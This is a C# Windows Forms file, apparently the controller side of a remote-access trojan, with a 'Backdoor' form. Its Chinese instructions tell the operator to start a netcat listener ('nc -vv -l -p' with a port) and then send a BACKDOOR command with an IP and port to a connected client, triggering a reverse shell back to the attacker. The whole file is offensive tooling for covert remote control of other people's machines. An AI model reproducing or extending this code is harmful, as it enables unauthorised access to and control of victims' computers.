using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;

namespace ctrl_server
{
    public partial class Backdoor : Form
    {
        public Socket client_socket;

        public Backdoor()
        {
            InitializeComponent();
        }


        private void Backdoor_Load(object sender, EventArgs e)
        {
            string tip = "提示：\r\n";
            tip += "1、后门是反弹后门，所以先启动nc打开监听端口,\r\n  命令为“nc -vv -l -p 【端口号】。”\r\n";
            tip += "2、接下来填好IP和PORT后，向客户端发送启动后门的命令。";
            label1.Text = tip;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (client_socket == null)
            {
                MessageBox.Show("Client Socket is NULL");
                return;
            }

            string cmd = "BACKDOOR\n";
            cmd += txtIP.Text + "\n";
            cmd += txtPort.Text + "\n";
            byte[] buf = ASCIIEncoding.ASCII.GetBytes(cmd);
            try
            {
                client_socket.Send(buf, buf.Length, SocketFlags.None);
                MessageBox.Show("Send Success!");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Send FAILURE!\r\n" + ex.Message);
            }
          
        }
    }
}
